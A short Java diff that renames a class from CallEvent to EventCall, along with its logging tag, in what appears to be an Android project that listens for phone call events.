@@ -10,9 +10,9 @@ import com.ht.RCSAndroidGUI.listener.ListenerCall;
 import com.ht.RCSAndroidGUI.util.DataBuffer;
 import com.ht.RCSAndroidGUI.util.WChar;
 
-public class CallEvent extends EventBase implements Observer<Call> {
+public class EventCall extends EventBase implements Observer<Call> {
 		/** The Constant TAG. */
-		private static final String TAG = "CallEvent";
+		private static final String TAG = "EventCall";
 
 		private int actionOnExit, actionOnEnter;
 		private String number;
